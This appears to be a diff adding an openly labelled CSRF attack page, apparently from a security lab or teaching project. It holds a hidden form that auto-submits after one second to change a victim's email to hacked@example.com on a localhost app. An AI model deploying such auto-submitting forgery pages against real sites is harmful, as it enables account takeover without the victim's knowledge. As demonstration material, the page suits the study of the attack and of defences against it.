@@ -1,0 +1,16 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Napadac</title></head><body>
+  <h2>Napadac ruta (maliciozno)</h2>
+  <p>Ova stranica automatski šalje obrazac koji pokušava promijeniti e-poštu žrtve.</p>
+
+  <form id="attack" method="post" action="http://localhost:5000/change-email">
+    <input type="hidden" name="email" value="hacked@example.com">
+    <input type="hidden" name="next" value="/" />
+  </form>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('attack').submit();
+    }, 1000);
+  </script>
+</body></html>
